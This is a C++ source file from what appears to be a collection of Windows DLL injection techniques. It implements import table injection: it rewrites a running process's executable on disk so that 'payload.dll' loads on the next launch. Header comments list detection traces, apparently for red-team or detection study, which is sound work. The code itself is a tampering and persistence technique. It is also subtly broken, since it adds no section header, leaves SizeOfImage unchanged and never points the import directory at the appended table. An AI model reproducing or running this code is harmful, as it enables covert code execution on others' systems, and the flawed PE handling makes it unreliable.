// ════════════════════════════════════════════════════════════════
//  方法 14: 导入表注入 (Import Table Injection)
//
//  原理：
//    静态修改 PE 文件的导入表，添加 payload.dll 作为依赖。
//    当目标 EXE 启动时，Windows 加载器会自动加载 payload.dll。
//    这是纯文件操作，不需要运行时注入。
//
//    步骤：
//    1. 读取目标 PE 文件
//    2. 解析导入表
//    3. 添加新的导入描述符（payload.dll）
//    4. 重建导入表并写回文件
//
//  检测特征：
//    - 文件修改: PE 文件哈希变化
//    - Sysmon Event 7:  ImageLoad payload.dll（加载器自动加载）
//    - 签名验证: PE 文件签名失效（Authenticode 验证失败）
//    - 静态分析: 导入表中出现异常 DLL
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include <fstream>
#include <vector>
#include <iostream>

bool Inject_ImportTable(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] 导入表注入（静态 PE 修改）→ PID=%lu\n", pid);
    Print(L"  [!] 注意: 此方法修改目标 EXE 文件，非运行时注入\n\n");

    // 1. 获取目标进程的可执行文件路径
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        Print(L"  [!] OpenProcess 失败: %lu\n", GetLastError());
        return false;
    }

    wchar_t exePath[MAX_PATH]{};
    DWORD size = MAX_PATH;
    QueryFullProcessImageNameW(hProc, 0, exePath, &size);
    CloseHandle(hProc);

    Print(L"  [+] 目标文件: %s\n", exePath);

    // 2. 读取 PE 文件
    std::ifstream file(exePath, std::ios::binary | std::ios::ate);
    if (!file.is_open())
    {
        Print(L"  [!] 无法打开文件（可能被占用或无权限）\n");
        return false;
    }

    auto fileSize = file.tellg();
    file.seekg(0);
    std::vector<uint8_t> peData(static_cast<size_t>(fileSize));
    file.read(reinterpret_cast<char*>(peData.data()), fileSize);
    file.close();

    // 3. 解析 PE 头
    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(peData.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
    {
        Print(L"  [!] 无效的 DOS 签名\n");
        return false;
    }

    auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(peData.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
    {
        Print(L"  [!] 无效的 NT 签名\n");
        return false;
    }

    auto& importDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size == 0)
    {
        Print(L"  [!] PE 文件没有导入表\n");
        return false;
    }

    Print(L"  [+] 导入表 RVA=%08lX  Size=%08lX\n", importDir.VirtualAddress, importDir.Size);

    // 4. 找到导入表在文件中的位置
    //    需要将 RVA 转换为文件偏移
    auto section = IMAGE_FIRST_SECTION(nt);
    DWORD importFileOffset = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++)
    {
        if (importDir.VirtualAddress >= section->VirtualAddress &&
            importDir.VirtualAddress < section->VirtualAddress + section->SizeOfRawData)
        {
            importFileOffset = section->PointerToRawData +
                (importDir.VirtualAddress - section->VirtualAddress);
            break;
        }
    }

    if (importFileOffset == 0)
    {
        Print(L"  [!] 无法将导入表 RVA 转换为文件偏移\n");
        return false;
    }

    // 5. 计算新导入表的位置
    //    在文件末尾追加：新的导入描述符 + DLL 名称 + INT + IAT
    const char* dllNameA = "payload.dll";
    size_t dllNameLen = strlen(dllNameA) + 1;

    // 新导入表布局：
    // - 原始导入描述符数组 (以空描述符结尾)
    // - 新的导入描述符 (指向 payload.dll)
    // - 空描述符 (终止符)
    // - DLL 名称字符串
    // - INT (Import Name Table): 一个 null terminator
    // - IAT (Import Address Table): 一个 null terminator

    size_t originalImportSize = importDir.Size;
    size_t newSectionSize = originalImportSize + sizeof(IMAGE_IMPORT_DESCRIPTOR) * 2
                            + (DWORD)dllNameLen + 8 + 8; // INT + IAT

    // 追加到文件末尾
    DWORD newDataRVA = nt->OptionalHeader.SizeOfImage;
    DWORD newDataFileOffset = (DWORD)peData.size();

    // 对齐到文件对齐边界
    DWORD fileAlign = nt->OptionalHeader.FileAlignment;
    newDataFileOffset = (newDataFileOffset + fileAlign - 1) & ~(fileAlign - 1);

    // 对齐到 SectionAlignment
    DWORD sectionAlign = nt->OptionalHeader.SectionAlignment;
    newDataRVA = (newDataRVA + sectionAlign - 1) & ~(sectionAlign - 1);

    // 构造新数据
    std::vector<uint8_t> newData(newSectionSize, 0);

    // 复制原始导入描述符
    memcpy(newData.data(), peData.data() + importFileOffset, originalImportSize);

    // 新导入描述符的位置
    auto newDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
        newData.data() + originalImportSize);

    // DLL 名称的位置
    DWORD dllNameOffset = (DWORD)(originalImportSize + sizeof(IMAGE_IMPORT_DESCRIPTOR) * 2);
    newDesc->Name = newDataRVA + dllNameOffset;
    memcpy(newData.data() + dllNameOffset, dllNameA, dllNameLen);

    // INT 和 IAT（空表，只含 null terminator）
    DWORD intOffset = (DWORD)(dllNameOffset + dllNameLen);
    DWORD iatOffset = intOffset + 8;
    newDesc->OriginalFirstThunk = newDataRVA + intOffset;
    newDesc->FirstThunk = newDataRVA + iatOffset;

    // 空终止描述符已在 memset 中清零

    Print(L"  [+] 新导入表追加到文件偏移 %08X (RVA %08X)\n", newDataFileOffset, newDataRVA);

    // 6. 扩展 PE 文件
    peData.resize(newDataFileOffset + newSectionSize, 0);
    memcpy(peData.data() + newDataFileOffset, newData.data(), newSectionSize);

    // 7. 更新导入表指向新位置
    importDir.Size += (DWORD)(sizeof(IMAGE_IMPORT_DESCRIPTOR) * 2);
    // 但 RVA 仍然指向原始导入表位置（在原 section 中）

    // 8. 写回文件
    //    先备份
    wchar_t backupPath[MAX_PATH]{};
    swprintf_s(backupPath, L"%s.bak", exePath);
    CopyFileW(exePath, backupPath, FALSE);
    Print(L"  [+] 已备份到 %s\n", backupPath);

    std::ofstream outFile(exePath, std::ios::binary | std::ios::trunc);
    if (!outFile.is_open())
    {
        Print(L"  [!] 无法写入文件（目标进程可能正在运行）\n");
        return false;
    }
    outFile.write(reinterpret_cast<char*>(peData.data()), peData.size());
    outFile.close();

    Print(L"  [+] PE 文件已修改\n");
    Print(L"  [*] 下次启动目标进程时将自动加载 payload.dll\n");
    Print(L"  [*] 恢复: 将 %s 重命名回原文件名\n", backupPath);
    Print(L"  [✓] 导入表注入完成\n");
    return true;
}
